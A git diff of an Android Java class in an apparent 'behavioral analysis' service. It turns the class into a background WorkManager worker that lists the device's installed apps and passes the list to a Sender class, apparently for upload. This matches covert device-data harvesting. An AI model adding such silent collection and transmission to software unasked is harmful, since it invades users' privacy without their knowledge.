@@ -3,16 +3,28 @@ package com.behavioralanalysis.service;
 import android.content.Context;
 import android.content.pm.PackageInfo;
 
+import androidx.annotation.NonNull;
+import androidx.work.Worker;
+import androidx.work.WorkerParameters;
+
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.util.List;
 
-public class Apps {
-    public static JSONArray get(boolean withSystemPackages) {
-        JSONArray array = new JSONArray();
+public class Apps extends Worker {
+    public static final String TAG = "app";
+
+    public Apps(@NonNull Context context, @NonNull WorkerParameters workerParams) {
+        super(context, workerParams);
+    }
+
+    @NonNull
+    @Override
+    public Result doWork() {
         try {
+            JSONArray array = new JSONArray();
             Context context = MainService.getContext();
             List<PackageInfo> packages = context
                     .getPackageManager()
@@ -20,7 +32,7 @@ public class Apps {
 
             for (int i = 0; i < packages.size(); i++) {
                 PackageInfo packageInfo = packages.get(i);
-                if (!withSystemPackages && packageInfo.versionName == null) {
+                if (packageInfo.versionName == null) {
                     continue;
                 }
 
@@ -40,10 +52,12 @@ public class Apps {
                 } catch (JSONException ex) {
                 }
             }
-        } catch (Exception ex) {
-            ex.printStackTrace();
-        }
 
-        return array;
+            Sender.send(TAG, array.toString());
+
+            return Result.success();
+        } catch (Exception ex) {
+            return Result.failure();
+        }
     }
 }
